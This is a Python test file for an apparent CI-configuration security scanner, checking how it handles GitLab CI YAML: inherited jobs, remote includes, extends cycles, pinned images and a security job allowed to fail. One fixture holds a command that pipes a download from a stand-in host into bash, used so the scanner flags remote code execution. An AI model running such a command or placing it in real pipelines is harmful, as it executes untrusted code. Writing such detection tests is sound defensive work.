from fastapi.testclient import TestClient
from app.main import app

def scan(content):
    return TestClient(app).post('/analyze',json={'filename':'.gitlab-ci.yml','content':content}).json()


def test_inherited_remote_execution_detected():
    result=scan('.template:\n  script: curl https://example.invalid/run | bash\nbuild:\n  extends: .template\n')
    assert result['status']=='fail' and any(f['category']=='remote_code_execution' for f in result['findings'])


def test_includes_prevent_clean_full_coverage():
    result=scan('include: remote.yml\nbuild:\n  script: echo hello\n')
    assert result['coverage']=='partial' and result['decision_floor']=='review'


def test_cycles_are_errors():
    result=scan('.a:\n  extends: .b\n.b:\n  extends: .a\nbuild:\n  extends: .a\n  script: echo hi\n')
    assert result['status']=='error'


def test_standalone_pinned_job_completed():
    result=scan('default:\n  image: alpine@sha256:'+'a'*64+'\nbuild:\n  script: echo hello\n')
    assert result['status']=='pass' and result['coverage']=='full'


def test_security_failure_cannot_be_silently_ignored():
    result=scan('security_scan:\n  script: echo scan\n  allow_failure: true\n')
    assert any(f['category']=='security_gate_bypass' for f in result['findings'])
